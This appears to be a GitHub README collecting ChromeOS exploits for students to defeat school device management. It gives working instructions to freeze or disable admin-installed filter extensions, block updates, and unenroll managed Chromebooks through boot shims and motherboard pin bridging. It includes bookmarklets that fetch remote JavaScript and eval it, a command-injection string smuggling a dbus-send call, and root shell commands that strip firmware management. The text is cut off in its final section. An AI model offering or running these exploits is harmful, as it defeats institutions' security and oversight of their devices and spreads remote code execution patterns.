# Exploits And Hacks
This is a curated list of exploits for ChromeOS. It started with LTBEEF, and now there is more!
Many of these exploits can destory your computer if used inproperly. So PLEASE PLEASE make sure you follow these instructions very carefully!
If you need help ask it <a href="https://github.com/Brandon421-ops/Exploits-And-Hacks/discussions">here</a>

Note: Students to see the list of more exploits click on JPCMG [LTBEEF with Service workers and scroll down than click TerraOS and scroll down. Only if you are on my github.io website.
  
**ATTENTION ALL SYS ADMINS!!!**

Hello, I am Brandon and I forked this repo from <a href="https://github.com/3kh0/ext-remover">3kh0</a> in order to give updated and old exploits for the masses and to prove one thing, chromebooks are literal trash, and a poor excuse for a computer. They are full of exploits, you might think you blocked/patched them all but then 3 more pop up. It is a endless game of whack-a-mole. Treat your students to a windows computer, they will thank you. And don't you dare start to think "My school district does not have that kind of money", it most likely does! How much are you paying the blocker companies? Think about that.

<img width="250px" src="https://user-images.githubusercontent.com/58097612/191354621-bf7ff072-b9d7-46b5-994a-4d2adbf0e4f3.png">  
Image Credit: LittleMissNyan

<details>
<summary><b>LTMEAT</b> Freeze extensions</summary>

  **DO NOT UPDATE YOUR CHROMEBOOK TO CHROME VERSION 115 OR ABOVE**

**Patched** **On** **Chrome** **Versions** **115** **And** **above**

**L**iterally **T**he **M**eatiest **E**xploit of **A**ll **T**ime

From [ltmeat.bypassi.com](https://ltmeat.bypassi.com), if you are intrested in how this exploit works, check out that website.

1. Find a page belonging to the extension you want to disable. `chrome://extensions`, `chrome://extensions-internals`, and `chrome://process-internals` are all good places to find your extension's ID (a 32-character lowercase string). You can also just do a simple Google search. Once you have your ID, substitute it into the hostname in the URL below:

```
chrome-extension://extensionidhere/manifest.json
```

For some filters like Securly, the block screen is already an extension page. 

2. Bookmark the extension page (bookmark A) if you wish. Then, bookmark `chrome://kill` (B) and `chrome://hang` (C). 
3. While on the extension page (A), click the `chrome://kill` bookmark (B). The page should crash. You should already have the next step prepared. 
4. Instantly start spamming `chrome://hang` (bookmark C) and quickly reload the page while spamming (ideally with the refresh key on your keyboard or `ctrl`+`R`). You should have reloaded within one or two seconds of killing the page. 

If the extension page (bookmark A) no longer loads, then LTMEAT worked! You can close your tabs and the extension will basically be dead. If nothing loads, then you probably reloaded too late or spammed too slow. This isn't rocket science! Restart your computer to revert back to normal. 

Exploit made by [Bypassi#7037](https://buymeacoffee.com/bypassi), [further reading](https://ltmeat.bypassi.com)

### "Help me! I'm an idiot!"

Turns out that I had far too much faith in society when making this page. Some of you skids out there are really, really stupid and also can't read. So here are the answers to some commonly asked questions. 

**How do I get an extension ID?**

Okay, fair. Extension IDs are leaked in a couple of places. Generally, the best way to get them is to go to extension settings and copy the URL query value.

**It says blocked by client?**

That's the message you get when you try to visit an a page belonging to an extension that doesn't exist. The error message (`ERR_BLOCKED_BY_CLIENT`) is extremely misleading. Nobody blocked it--you just need to find the right extension ID (see above).

If you got this because you tried to visit the `extension_id_here_please` example URL, you should be extremely ashamed of yourself. Please change and grow as a person. 

**I don't have a bookmarks bar!!!!**

First, try running ctrl+shift+B. If that doesn't work, go to `chrome://settings` and turn on the "home button" feature, then set it to `chrome://hang`. A home icon should show up to the right of your refresh icon in the top left. Use that instead of bookmark C.

There is a version where you don't need bookmarklets, but I am currently gatekeeping it (L). Check this site daily to see if new alternate instructions have been posted. 

**I disabled an extension but now I can't load websites!**

If you actually just read the writeup, you'd know that this would happen if the extension's background page loaded and its listeners were already initialized before you used `chrome://hang`. You can double-check whether the extension is listening using `chrome://extensions-internals`, assuming you have a few brain cells in your head.

Anyway, no listeners means you were too slow. Either you waited more than three seconds between bookmark B and reloading the page, or you weren't spamming bookmark C fast enough. The most reliable fix for this is to just restart your computer and try again. Try to match the pace of the gif below: (note the reload) 

![image](https://ltmeat.bypassi.com/img/abc.gif)

**The bookmarks don't do anything when I click them!**

Might be admin-blocked. Either be smart enough to figure out another way, or check this site daily to see if new alternate instructions have been posted.

**I disabled the extension, why is some stuff still blocked?**

I have bad news for you... not all filters are Chrome Extensions. And again, make sure the extension pages (like bookmark A) are frozen before you assume that your skiddy self successfully did the exploit. 

*Need more help? [Ask in the discussions](https://github.com/3kh0/ext-remover/discussions)*

</details>

<details>
<summary><b>Baby LTMEAT</b> Freeze extensions</summary>

**Patched On Chrome Versions 115 And Above**
  
BABY METHOD
FOR THE TECHNOLOGICALLY CHALLENGES.

1. Follow step one of the original instructions to find a page belonging to the Chrome extension you want to disable.

2. Visit that chrome-extension://blockeridhere page, then type chrome://hang in the URL bar of that tab. It should start loading infinitely.

3. Right-click the tab and duplicate it. Don't close anything.

4. Go to the chrome://extensions page for the blocker extension you want to Disable.

5. If that page has any sort of switch, such as "Allow access to file URLs", click that switch. If there are no clickable switches, cry in a corner or something.

The extension should now be broken, assuming you clicked the switch! Only one of the two duplicate tabs should be left standing. You can close your tabs now.

</details>

<details>
<summary><b>LTMEAT Flood</b> Freeze extensions</summary>

  **If your Chromebook has received the 115 And Above patch on the stable channel Then Here's A New Method For LTMEAT**
  
  
**Unpatched on 115 and above**

**L**iterally **T**he **M**eatiest **E**xploit of **A**ll **T**ime

1. Create a bookmark folder and paste the extension page lots of times. (About 800 minimum is recommended assuming your Chromebook is average school quality) It is recommended that you add the extension page at the beginning of the folder.

2. Right click and open all in a new window.

3. Close the window with all those tabs.

4. Open the folder in a new window again, and Chrome should hang those tabs to take care of the old ones in the background that were just closed. (Equivalent to the duplicate tab step in Bypassi's method)

5. Flip the Allow access to file URLs switch in the extension settings and then you've bypassed the patch and the exploit is working.

6. Close everything and you're good to go. If it didn't work, try adjusting the number of open tabs. This is the LTMEAT Flood Method, and also unofficially called Alternate Method # 2. Enjoy a much longer life of LTMEAT!

**Not working?** Ensure you open a large set, but not too large, of extension tabs (_/generated_background_page.html or /manifest.json) for a permanent freeze.

Credit to <a href="https://github.com/AshtonDavies">Ashton Davies</a> for finding this workaround

</details>

<details>
<summary><b>Baby LTMEAT Flood</b> Freeze extensions</summary>

**Unpatched on 115 and above**

1. First of all, get your folder with 800+ extension page tabs and open it in a new window, for my Chromebook i used 800 extension page tabs as i feel it's the right amount for me

2. Close the newly opened Window with 800+ extension page tabs

3. Click into your folder, and open one of the extension page tab in a new window, maybe waiting slightly longer this time, to confirm it worked. If it loads, you did it wrong. If you see a "page unresponsive screen, and a wait/exit page button" you did it right" But don't click either of the buttons. (if you want to do it fast you can just see that the page always has a spinning loading circle)

4. Now go to `chrome://extensions/?id=yourblockerID`  Then scroll down and flick the "allow access to file URLs" lever and close the window with the 1 extension page tab remaining.

</details>

<details>
<summary><b>LTVegan</b> Freeze extensions</summary>

1. find the biggest file for your blocker extension

2. open chrome://extensions/?id=IDHERE

3. CTRL+A to copy all of the code, then drag the copied text to the tabs bar. this may freeze your  chromebook a few times.

4. start clicking the chrome extension tab (chrome://extensions/?id=IDHERE ) a few times, then wait ( chromebook is currently frozen).

5. when your chromebook isn’t as frozen, right click the page that has the huge file tab and duplicate it.

6. click the “Allow access to file URLs” (multiple times for good measure) and the first tab should close itself. if BOTH tabs closed themselves, you did something wrong, or just try again.

7. you should be able to normally use your  Chromebook now. afaik you might be able to close the duplicated tab but I didn’t close it and it lasted for a long time.

</details>

<details>
<summary><b>Anesthesia</b> Freeze extensions with printing</summary>

1. Find your extension's largest file. This can usually be found by poking around in your extension's manifest.json or you can use <a href="https://robwu.nl/crxviewer/">Rob Wu's crxviewer</a> to find your extensions largest file.

2. Go to that page. and hit `Ctrl`+`P`. A print window shoudl show up, with a number of pages in the top right.

3. Do everything you can to increase that number. Shrink down margins, change layout to landscape, anything you can. The higher you can get that number, the longer the effect will last.

4 Hit reload. The page should start hanging.

5. Go to your extension's settings page. This is in `chrome://extensions`.

6. Duplicate your "printing" tab, and go back to your extension's settings page.

7. Flip any switch you can find there. Usually there'll be one titled "`Allow Access to File:// [URL]s`".

8. Presto! Go have fun on the (probably) unblocked web.

FAQ:
Where do I find my extension's manifest.json?
First find your extension's ID. This is a 32-character code that can be found in your extension's settings page, normally near or at the top. Then go to chrome-extension://your-32-char-id-goes-here/manifest.json

Credit to <a href="https://buymeacoffee.com/bypassi">Bypassi</a> for the original LTMEAT framework, and HUGE thanks to Swordmaster4321 for discovering that pages can be hanged with printing.

</details>

<details>
<summary><b>LoMoH</b> Disable extensions</summary>

  **This exploit has been patched in Chrome OS 111 after being found and reported. It should have gotten admin protection sooner.**

  **About: LoMoH is a Chromebook exploit that uses the Chrome OS locked mode feature to soft disable enforced extensions (excluding Hapara Highlights if installed).**
  
HTML VERSION: <a href="https://tiny.cc/LoMoH">LoMoH HTML</a>

BOOKMARKLET VERSION: `javascript:(function(){if (location.hostname == "docs.google.com") {document.body.innerHTML = document.body.innerHTML.replace("Locked mode is on", "Are you ready to turn off extensions?%22);%20document.body.innerHTML%20=%20document.body.innerHTML.replace(%22You%20have%20already%20opened%20and%20closed%20this%20quiz.%20Opening%20this%20quiz%20again%20will%20notify%20the%20form%20owner%20by%20email.%22,%20%22This%20will%20reload%20all%20tabs%20in%20your%20browser%22);%20var%20button%20=%20document.getElementById(%27mG61Hd%27);%20button.innerHTML%20=%20button.innerHTML.replace(%22Start%20Quiz%22,%20%22Disable%20Extensions%22);%20button.addEventListener(%27click%27,%20function(event){window.close();})}%20else%20{window.open(%22https://docs.google.com/forms/u/0/d/e/1FAIpQLSf5EYwrSUjmQhBOasMpORZy80eBCYb7qCpEwWNoRPUGyObGMA/startquiz%22);}})()`

Credit to <a href="https://github.com/AshtonDavies">Ashton Davies</a> for finding this exploit

</details>

<details>
<summary><b>Dextensify</b> Freeze extensions</summary>

**Dextensify is an exploit which lets you disable most admin-installed Chrome extensions from any webpage. It can be used from regular websites, HTML files, and data URLs.**

Go here and follow instructions: <a href="https://dextensify.pages.dev/main">Dextensify Main HTML</a>, or download the file here <a href="https://github.com/Brandon421-ops/Exploits-And-Hacks/blob/main/Dextensify.html">Dextensify.html</a>

Credit to <a href="https://ading.dev/">ading2210</a> for finding/Making this exploit

</details>

<details>
<summary><b>JPCMG</b> LTBEEF with Service workers</summary>

**Requirements**
- Access to `chrome://serviceworker-internals`
- Inspect element

1. Go to `chrome://serviceworker-internals`
2. Find your extension, this wont work if theres not a plugin in there.
3. Hit the start button then the `inspect` button, run basic LTBEEF code
```js
chrome.management.setEnabled('<plugin id here>',false)
```
4. Profit

![image](https://user-images.githubusercontent.com/58097612/234904781-4d5ad77e-6045-435e-8aae-df12dec53013.png)

Thanks to Nyaann#3881 for this exploit

</details>

<details>
<summary><b>BackAge</b> Make extensions go offline</summary>

### Requirements
- Access to `chrome://extensions`
- The option to turn on dev mode on the extensions page needs to be unblocked

**Instructions**

1. Go to `chrome://extensions`

2. Turn on dev mode in the top right corner

3. and click on the background page of the extension you want to block

4. click on Network

5. click Disable Cache 

6. Also click on No throttling, and be sure to change that to Offline Once that is finished 

7. Head to Settings, and scroll down. Click on the Disable Javascript box. DO NOT CLOSE THIS WINDOW (unless you want the extension to work again)

Have fun unblocking all websites.

Exploit found by <a href="https://github.com/axolotl8">axolotl8</a>

</details>

<details>
<summary><b>Corkey</b> Corrupt extensions</summary>

**Corkey does indeed include power washing the Chromebook, which wipes local data including everything under "My files," so I suggest you select everything you want to drag and back up to Google Drive if that's available for your account.**

**Chromebooks Only**

1. `Esc`+`Refresh`+`Power` and re-enroll (Enter recovery page) or you can just powerwash

2. log into your chromebook and immediately turn off wifi and do `refresh`+`power` to (instant restart)

3. Log back into your chromebook with the wifi off. There should be something on the side of the connect wifi page that says log in offline or sign in as a existing user.

4. Go to `chrome://extensions`, turn on wifi, and wait for your schools blocking extension to appear.

5. As soon as it appears turn off wifi and instant restart as fast as you can.

6. Log back in and go back to extensions and wait. If it says your blocking extension could be corrupted or doesnt appear at all then it worked (wait atleast a minute with a close watch incase it comes back)

7. If it didnt work repeat from step 1.

8. If it did work you could go onto anything

</details>

<details>
<summary><b>CorkGuardian</b> Freeze goguardian</summary>

**You have to have the toggle in toolbar option on for goguardian in the `chrome://extensions` tab.**

1. Turn off Wi-Fi

2. Go to `chrome://extensions/?id=haldlgldplgnggkjaafhelgiaglafanh`

3. Flip on and off the allow access to file urls button

4. rapidly click on the GoGuardian extension until it turns dark grey

5. Turn wifi back on

6. Have fun browsing anything you want

Note: this only bypasses GoGuardian, any other blockers (like LightSpeed) or network blocks aren't bypassed.
This works on atleast 122
Signing out again will remove the blocks, and you have to do the process again.

</details>

<details>
<summary><b>Extension Launcher</b> Install extensions w/o allowlist</summary>
A bookmarklet capable of installing extensions, for those without a allowlist. 

Steps: 

1. Go to <a href="https://extension-installer.glitch.me/code.js">here</a> bookmark the code there (Might make a dns)

2. go to <a href="https://chrome.google.com/webstorex">chrome.google.com/webstorex</a> and use the bookmarklet, then put the icon of the extension, the id, and name of it (Doesn't matter just put anything)

3. press download, and it will work.

**Extra Notes**
- Credit to "Aka, but nice" on discord.
- Dns will be up soon, if bookmarklets are blocked
- This will not work if you have a blocklist this is only for if when you go to the webstore it shows blocked
</details>

<details>
<summary><b>Point-Blank</b> Scripts on extension pages</summary>

This exploit allows you to run scripts, on extensions pages, this is a great example of how Chromebooks are a piece of garbage.

<i>Getting started</i>
(Note: if bookmarklets are blocked your screwed.)

1. Go to <a href="https://spot-maze-chinchilla.glitch.me/ingot.js">here</a> <a href="https://raw.githubusercontent.com/3kh0/ext-remover/main/newpointblank.js">if blocked</a> on your school chromebook.

2. Make a bookmark with the code there.

3. Once that is done,

 If you have Securly go to <a href="https://tinyurl.com/bettergoofcurly">here</a> if it says blocked by chrome, reload (you have to actually have securly ofc)
 
 If you have iBoss go to <a href="https://tinyurl.com/goofboss">here</a>.
 
 If you have Cisco Umbrella go to <a href="https://tinyurl.com/goofumbrella">here</a>.
 
 If you have Blocksi go to <a href="https://tinyurl.com/goofsi">here</a>.
 
 And if you have GoGuardian(might not work) go to <a href="https://tinyurl.com/goofguardian">here</a>. 
 
 Now most of these links are a block page(this is intentional) on each page should have a blue link, click the link on the page if it opens a blank page click the bookmarklet that you just made and click either hard disable or soft disable, you can also run some of the scripts and run your own code, your extension may disable javascript being ran on it, so running your own code may not work.
 
**Extra notes**
- I recommend doing soft disable, which only disables it until restart. 
- The launcher was made by 3kh0, but the idea was from <a href="https://bolg.glitch.me/_/point-blank/">Bypassi#7037</a>
- If your school updated GoGuardian, this exploit may not work.

</details>

<details>
<summary><b>UBoss</b> Tamper with IBoss</summary>

By the BlueHatCrew
<a href="https://dsc.gg/blue-hat-crew">https://dsc.gg/blue-hat-crew</a>

This works only for iBoss, and Blocksi, If you don't have one of these, use Blank3r or Point Blank.

1. Go to https://tinyurl.com/byeswamp if you have iBoss or https://tinyurl.com/blockboss if you have Blocksi.
Then bookmark the code below
```js
javascript:opener.eval(`fetch("https://rounded-boiling-flax.glitch.me/uboss.js").then(data=>{data.text().then(e=>{eval(e)})})`) && close();
```
2. Then go to the site with your blocker that was listed above.
3. Run the code. Follow the instructions there.

If it doesnt work let us know by creating a discussion, this was made in partnership with Aka, but nice#5094 and Bypassi#7037.

</details>

<details>
<summary><b>A Bypass For IBoss</b> Unblock websites that are blocked by IBoss</summary>

1. Firstly go over to your unblocked website you want to access. 

2. After visiting the website it should be blocked.

3. You want to turn off your wifi, then spamclick the blocked link  (not the url)

4. Then after spamclicking, turn on your wifi.

5. It should redirect you to "your connections been dissrupted" press reload.

6. Then you should be at the blocked website completely unblocked!!

(NOTE: THIS ONLY WORKS ON SOME WEBSITES)

</details>

<details>
<summary><b>CAUB</b> Prevent Updates</summary>

This exploit keeps your chromebook downgraded (or on the current version) without automatic updates screwing you over. This exploit was found by Catakang#0987. Using onc files, you can convince your chromebook that the wifi that you're connected to is pay-to-use (like a hotspot using data), and thus it will not check for updates.

![image](https://user-images.githubusercontent.com/58097612/212685932-ef9c802e-6040-42a3-be6e-10997162b7cd.png)

<i>Getting started</i>

1. Go to `chrome://network#state` (on your school chromebook of course; if this is blocked then ur kinda screwed lol).
2. Scroll to the bottom of the page; you should see a list of "favorite" wifis that you've connected to in the past.
3. Click the `+` sign next to the wifi name of each network that you commonly connect your chromebook to.
4. The more wifis you expand, the better, but note that they have to come from the "favorites" section.
5. Use ctrl+a and ctrl+c to copy all the text on the entire network#state page.
6. Go to <a href="https://c-a-u-b.glitch.me">caub.glitch.me</a>.
7. Paste the copied text into the textbox bshelow.
8. Press the `generate onc` button below the textbox.
9. Once you have downloaded the file, go to `chrome://network#general`.
10. Click on the `import onc` button.
11. Import the newly downloaded file.

**Extra notes**
- Your chromebook will no longer automatically update. (as long as you are on a wifi that you used caub on)
- Be careful not to stay on a wifi for too long without using caub on it, otherwise you might update.
- We cannot guarantee that this will work on every wifi

</details>

<details>
<summary><b>CAUB Via Flags</b> Prevent Updates</summary>

This alt exploit keeps your chromebook downgraded (or on the current version) without automatic updates screwing you over. This exploit was found by <a href="https://github.com/MechaXYZ">MechaXYZ</a>. Using a chrome flag, you can convince your chromebook not to automatic update.

### Requirements
- Access to `chrome://flags`

<i>Getting started</i>

1. Go to `chrome://flags#show-metered-toggle` or search "metered" in `chrome://flags` instead.

2. Enable it and restart your device.

3. Open the Settings app.

4. Go to your Network >> Advanced >> Show metered toggle and turn it on

**Extra notes**
- Your chromebook will no longer automatically update. (as long as you have the flag enabled)
- And you must be able to enable flags if it ain't blocked otherwise this exploit won't work

</details>

<details>
<summary><b>LTBEEF</b> Disable extensions</summary>

LTBEEF is an exploit, created by Bypassi#7037, which abuses api endpoints within the google chrome webstore. The original site created for this exploit can be found at <a href="https://ltbeef.netlify.app/">ltbeef.netlify.app</a>

<b>Please Note:</b> This exploit only works on versions below 106, and eariler versions of 102
  
**Installation**  
There are several vesions of this exploit you can use, here are the 2 most common versions:
- *Bookmarklets*  
    1. To use a GUI, bookmark one of the below scripts:  
    - Ingot  
    ```js
    javascript:(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js';document.body.appendChild(a);}())
    ```
    - Compact Cow's UI  
    ```js
    javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
    ```  
    - Compact Cow's UI (Dark)
    ```js
    javascript:void fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);
    ```
    2. Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a> and click on that bookmark. 
    3. Flip the switches on the extentions you want to disable. Simple!  

    Photos of the GUI's:
    ![image](https://user-images.githubusercontent.com/58097612/193318485-5267cd59-fb65-45a5-ad28-7f068bbce974.png)
    ![image](https://user-images.githubusercontent.com/58097612/190276894-fc492c5c-b0ce-4943-ae56-603f75634618.png)
   
- *DNS servers*  
    By changing your DNS server, you can use LTBEEF, even if bookmarklets are blocked.  
      
    1. First, go to Settings > Network > Wifi > Network.
    2. Click on `Custom Name Servers`
    
    ![image](https://user-images.githubusercontent.com/88395302/212482302-82334f42-c421-45c2-b210-1e700652b5be.png)  
    
    3. Set every box there to the following ip:
    ```
    158.101.114.159
    ```
    (Hosted by The Greatest Giant#0110)  
    4. Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a> and click on that bookmark. 
    5. Flip the switches on the extentions you want to disable.
    6. Profit
    
</details>  

<details>
<summary><b>LTBEEF inspect</b> Using inspect to disable extensions</summary>

![image](https://user-images.githubusercontent.com/58097612/207386423-e6aa2095-d92d-44a8-a3d6-e42066bdf34e.png)

The screenshot below was preformed on `108.0.5359.75` (Official Build) (64-bit) on the stable channel. This has been tested and does work but has varying levels of success, you will need access to inspect element, more specifically, console.

1. Open this on your chromebook: 
```
chrome-extension://gndmhdcefbhlchkhipcnnbkcmicncehk/manifest.json
``` 
Shortened link: https://tinyurl.com/i-ltbeef
2. Open inspect and navigate to the console tab.
3. Run the basic LTBEEF code such as
```js
chrome.management.setEnabled('extensionid', false)
```
Replacing `extensionid` with the ID of the extension you want to disable, e.g. the stuff after the = in the URL bar when you click the extension's "details" button in chrome://extensions

Credit to SprinkzMC#8421 (aka Bypassi) for finding this!

![image](https://user-images.githubusercontent.com/58097612/207385046-5a9f6f07-6089-4775-9183-c11bd24ba02c.png)

To re-enable just go to the chrome web listing for the extension and click on the banner.

</details>

<details>
<summary><b>Blank3r</b> Reload extensions continuously</summary>

Point Blank is an exploit that allows you to run bookmarklets on privileged pages, such as the Chrome extensions page. This exploit was made with Point Blank as well.

You can either use the prompt or the gui the prompt is below

1. Bookmark this code:

```js
javascript:let shim = false;var ids = prompt("extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 145);
```

And the gui is in launcher.js


2. Navigate to `chrome://extensions`.

3. Click on a extension that YOU installed from the Chrome Web Store > Details.

4. In the URL bar, copy the string of letters and numbers after the `/?id=`.

5. Click "View in Chrome Web Store" and spam the excape key. If it loads into chrome webstore try again, if it is a blank screen click the bookmarklet.

5. Paste the id of the extension into the prompt or input box seperated by commas.

If you close the tab, the exploit will stop working.

</details>

<details>
<summary><b>Pencil Method</b> Unenroll by bridging pins on the motherboard</summary>

**This can harm your Chromebook if done incorrectly. Use at your own risk.**

**Unenrolling by bridging pins on the motherboard.**

The   <a href="https://blog.darkn.bio/blog/3-the-tsunami#bypassing-instructions">proper guide</a> was created by Darkn.

## Requirements

- Conductive material (staple, tin foil, paperclip, etc.)
- Scissors
- Tape (optional, recommended)
- USB drive or SD card with Sh1mmer flashed
- Screwdriver corresponding to the screws of your Chromebook

## Dismantling Hardware & Bridging Pins

**Instructions**

1. With a screwdriver, remove each screw from the bottom of your Chromebook.

2. Disconnect the battery. The battery cable placement varies between models.

3. On the motherboard, find the 8-pin chip with pins sticking out or in. It likely has winbond or GigaDevice branding, and it may show 25Q64[xx] or 25Q128[xx] below the branding. It may be located on the back of the motherboard.

4. Shape a piece of your conductive material long enough to connect to both sides of the chip and small enough to not make contact with multiple pins on either side of the chip.

5. Place one end of the conductive material on pin 3 (WP).

6. Place the other end of the conductive material on pin 8 (VCC).

7. If necessary, place tape on top of the chip to keep the conductive material on the pins.

8. Connect the battery.

## Performing the Exploit

**Instructions**

1. Boot into Sh1mmer with the USB.

2. In the Sh1mmer menu, navigate to Utilities.

3. Select **Un-Enroll Device**. This is necessary even if the process fails.

4. In the **Utilities** menu, select **Open Bash**.

5. In the bash shell, run the following commands:

`flashrom --wp-disable
/usr/share/vboot/bin/set_gbb_flags.sh 0x8090`

If the commands fail, the pins are not bridged correctly.

6. Reboot the Chromebook by pressing **Refresh** ↻ + **Power** ⏻.

7. Press **Ctrl + D** to bypass the OS verification screen.

8. Boot into Chrome OS.

9. Press **Ctrl** + **Alt** + **F2** to enter the VT2 shell.

10. Log in to the shell as **root**.

11. Run the following commands:

`tpm_manager_client take_ownership
cryptohome --action=remove_firmware_management_parameters`

12. Press **Ctrl** + **Alt** + **F1** to exit the VT2 shell.

13. Press **Ctrl+Alt+Shift+R**.

14. Click **Powerwash**.

</details>

<details>
<summary><b>CryptoSmite</b> Unenrollment</summary>

**CryptoSmite** is an exploit capable of completely unenrolling enterprise-managed Chromebooks. It was found by FWSmasher and released on **March 9th, 2024**.

**This exploit has been patched since Chrome OS 120.**

### Finding Kernver
If you're on v120 or higher, you need to downgrade in order to use CryptoSmite. To do this, you first need to check your `kernver=` in Recovery Mode.

1. Boot into Recovery Mode
   - Hold ESC + Refresh + Power for 2 or 3 seconds.
   - You should be on an "Insert Recovery Media" or "Let's step you through the recovery process" screen.
2. Press TAB and look at the last digit of the `kernver=` line

- `kernver=` ends with a 2! <br />
Congratulations, you can downgrade to v119 or lower! Follow the instructions at [Downgrading *Change versions*](#downgrading-change-versions) on how to downgrade.

- `kernver=` ends with a 3! <br />
Sorry, you can't downgrade to v119 or lower. Wait for a new unenrollment exploit or do a <a href="https://blog.darkn.bio/blog/3-the-tsunami">**dangerous** hardware modification</a>.

### Using CryptoSmite
1. Download a SH1MMER Prebuilt image here: <a href="dl.darkn.bio">https://dl.darkn.bio/SH1mmer/Prebuilt/</a>
2. Disable OS verification *(blocked or not, doesn't matter)*, and boot into the shim.
3. Navigate to Payloads and navigate to CryptoSmite using the arrow keys, then press `Enter`.
4. Type in `Y` then press enter, and it'll automatically reboot upon completion.
5. Proceed through the setup partially till you get to the Add Account Screen.
   - If you see an update prompt, reboot then press `CTRL + ALT + E` on the Wi-Fi screen.
     - This *should* allow skipping the update, or make it not appear at all.
6. Powerwash the Chromebook at the "Add Account" screen. Afterwards, it'll be fully unenrolled.

### Further Reading
- <a href="https://github.com/FWSmasher/CryptoSmite">Repository</a>  
- <a href="https://blog.coolelectronics.me/breaking-cros-2/">Writeup</a>
- <a href="https://exploitingchromium.blogspot.com/">Official Blogspot</a>

</details>

<details>
<summary><b>SH1mmer</b> Unenrollment</summary>  
sh1mmer is an exploit developed by the crew at Mercury Workshop. Credits can be found within the menu and on their site.  

Further information is now located at these links:

<a href="https://github.com/CoolElectronics/sh1mmer">Official Repository</a>  

<a href="https://sh1mmer.me/">Official Website (INSTRUCTIONS)</a>

<a href="https://dl.osu.bio/">Raw Shims Download</a>

</details>

<details>
<summary><b>SH1mmer V111 → V113</b> Unenrollment</summary>
How to use SH1MMER on v111 → v113
(if you're willing to take the back cover off your Chromebook)

you'll only need to do this once, and it will let you use SH1MMER even after it's been completely patched



        1. Unplug everything, open the back panel, disconnect the battery to disable WP, plug in the charger
        2. boot into SH1MMER and use "Un-Enroll / Deprovision" (yes I know it will show an error, but that doesn't
        matter)
        (you will also need to run "Disable block_devmode" if you're using the old legacy version)
        3. go to the bash shell and run this command:
        /usr/share/vboot/bin/set_gbb_flags.sh 0x8090
        do not use "Reset GBB Flags" after this

        4. exit SH1MMER, unplug everything, reconnect the battery, reconnect the charger
        5. boot up, press CTRL + D to enter developer mode
        6. once it completes, use CTRL + ALT + SHIFT + R to powerwash
        7. after powerwash, immediately go into VT2 by pressing CTRL + ALT + F2 (→), login as "root" and run these commands:
        tpm_manager_client take_ownership
        cryptohome --action=remove_firmware_management_parameters
        if it fails, try downgrading to v110 if possible. if you can't, use E-Halycon instead.
        8. press CTRL + ALT + F1 (←), use CTRL + ALT + SHIFT + R to powerwash again
        9. profit

        NOTE: if you're on dedede, your WP method is probably different. look your model up online to find the WP
        method.

</details>

<details>
<summary><b>E-Halcyon</b> Unenrollment Or Downgrade</summary>

First of all, you'll need a linux PC or VM. WSL is not guaranteed to work

Now, you'll need to boot into SH1MMER, and press the Un-Enroll option. It won't truly unenroll you if you've received the 112 update patching unenrollment and downgrading, but it is still a necessary step for the rest of this. If you've never used SH1MMER before or don't have an image lying around, make sure to follow all the instructions on sh1mmer.me for unenrollment before proceeding with the rest of the tutorial here

Next, you need a version 107 recovery image corresponding to your board, which you can pick up from chrome100.dev. Once you've downloaded the right image for your board and have confirmed it's for version 107, unzip it and save it to a safe place. Now open up a terminal and type in the following commands (make sure to replace /path/to/recovery/image.bin with the actual path)

```
git clone https://github.com/MercuryWorkshop/RecoMod
cd RecoMod
chmod +x recomod.sh
sudo ./recomod.sh -i /path/to/recovery/image.bin --halcyon --rw_legacy
```

The script will modify the image in place, and it can now be flashed with a standard recovery tool onto a USB of your choice.

Enable developer mode and get to the dev mode block screen similarly to how you would with SH1MMER, then plug in the USB. The recovery screen will show up, and at this point you need to start spamming the E key on your keyboard. It will begin a 5 minute wait sequence, and near the end of the 5 minutes start spamming E again. You will only have to wait 5 minutes once, subsequent boots will have the 5 minute wait omitted

The boot splash will show, and you will enter a special menu. Use arrow keys to navigate the cursor down to "activate halcyon environment" and press enter. Then navigate down to "Install halcyon semi-tethered" and wait for it to finish. Once it's finished, go back to "activate halcyon environment" and press "Boot halcyon semi-tethered". and you will be booted into a downgraded and unenrolled ChromeOS environment.

FAQ:
How does this work?
See the writeup for more information

Can the admins see that I'm doing this?
No.

Why don't my history/cookies/etc save after a reboot?
Unfixable restriction of cryptohome. See the writeup for more information

Why is my Chromebook "Missing or damaged?"
After installing E-Halcyon, you won't be able to boot Chrome OS normally. You'll have to keep the usb around to jumpstart the booting process

Where do I report bugs?
The RecoMod GitHub

Why does it say "E mode not activated" when I try to boot halcyon?
You spammed the E key when starting at the wrong time, or not at all

Credits:
CoolElectronics - RecoMod, working switch_root, and everything else
OlyB - Insight and contributions to the RecoMod script
vk6 - Created this website

</details>

<details>
<summary><b>Old Weird Unenrollment</b> Unenrollment</summary>

if you have a chromebook that's on a version below 101  
(check `chrome://version` to see)
press ctrl+alt+t and type this in            


`set_cellular_ppp \';dbus-send${IFS}--system${IFS}--print-reply${IFS}--dest=org.chromium.SessionManager${IFS}/org/chromium/SessionManager${IFS}org.chromium.SessionManagerInterface.ClearForcedReEnrollmentVpd;exit;\'`

                                                         
           then powerwash and it will unenroll           
                       cool right                        

    to re-enroll, open a bash shell and type these in one by one
```
sudo -i
```

```
vpd -i RW_VPD -s check_enrollment=1
```

```
echo "fast safe" > /mnt/stateful_partition/factory_install_reset
reboot
```

</details>

<details>
<summary><b>BlobeVM</b> Unblocked Chrome And Firefox Browser</summary>

### Installation
First start a new blank codespace by going to <a href="https://github.com/codespaces/">https://github.com/codespaces/</a> and choosing the "Blank" template.
Then copy and paste this command in your codespace terminal and hit enter.
```
curl -O https://raw.githubusercontent.com/Brandon421-ops/BlobeVM/main/install.sh
chmod +x install.sh
./install.sh
```

</details>

<details>
<summary><b>Linux On Gitpod</b> Linux Unblocked</summary>

# Linux On Gitpod
Source: 3kh0/GamingOnCodespaces

> [!NOTE]
> You may need a phone number and be able to recieve phone calls

```Always `CTRL` + Click links to open in new tab```

